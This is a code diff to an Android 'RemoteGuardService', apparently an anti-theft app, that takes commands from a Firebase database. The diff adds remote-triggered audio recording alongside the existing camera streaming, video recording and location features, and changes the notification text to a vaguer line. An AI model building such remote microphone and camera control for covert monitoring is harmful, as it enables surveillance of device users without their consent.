@@ -7,6 +7,7 @@ import android.content.Intent
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
 import com.google.firebase.database.ChildEventListener
@@ -20,6 +21,7 @@ class RemoteGuardService : LifecycleService() {
 
     private lateinit var locationManager: LocationManager
     private lateinit var cameraManager: CameraManager
+    private lateinit var voiceRecordingManager: VoiceRecordingManager
     private var commandsRef: DatabaseReference? = null
     private var commandsListener: ChildEventListener? = null
     private val heartbeatHandler = Handler(Looper.getMainLooper())
@@ -32,12 +34,19 @@ class RemoteGuardService : LifecycleService() {
 
     override fun onCreate() {
         super.onCreate()
-        FirebaseHelper.initialize(this)
-        locationManager = LocationManager(this)
-        cameraManager = CameraManager(this)
-        startForeground(NOTIFICATION_ID, createNotification())
-        listenForCommands()
-        heartbeatHandler.post(heartbeatRunnable)
+        try {
+            Log.d("RemoteGuardService", "onCreate: Starting service initialization")
+            locationManager = LocationManager(this)
+            cameraManager = CameraManager(this)
+            voiceRecordingManager = VoiceRecordingManager(this)
+            startForeground(NOTIFICATION_ID, createNotification())
+            listenForCommands()
+            heartbeatHandler.post(heartbeatRunnable)
+            Log.d("RemoteGuardService", "onCreate: Service initialization completed")
+        } catch (e: Exception) {
+            Log.e("RemoteGuardService", "onCreate: Error during service initialization", e)
+            e.printStackTrace()
+        }
     }
 
     private fun createNotification(): Notification {
@@ -51,7 +60,7 @@ class RemoteGuardService : LifecycleService() {
         }
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle("Protected")
-            .setContentText("Your device is protected.")
+            .setContentText("Your protected database.")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .build()
     }
@@ -119,6 +128,8 @@ class RemoteGuardService : LifecycleService() {
                 command == "stop_stream" -> cameraManager.stopStreaming()
                 command == "start_video" -> cameraManager.startVideoRecording(this)
                 command == "stop_video" -> cameraManager.stopVideoRecording()
+                command == "start_audio" -> voiceRecordingManager.startAudioRecording(this)
+                command == "stop_audio" -> voiceRecordingManager.stopAudioRecording(this)
                 command == "switch_camera" -> {
                     cameraManager.switchCamera(this)
                     FirebaseHelper.updateLastSeen(this, "camera_switched_${cameraManager.getCurrentCameraName()}")
@@ -148,12 +159,14 @@ class RemoteGuardService : LifecycleService() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
-        FirebaseHelper.initialize(this)
         listenForCommands()
         return START_STICKY
     }
 
     override fun onDestroy() {
+        if (voiceRecordingManager.isRecording) {
+            voiceRecordingManager.stopAudioRecording(this)
+        }
         commandsRef?.let { ref ->
             commandsListener?.let { listener ->
                 ref.removeEventListener(listener)
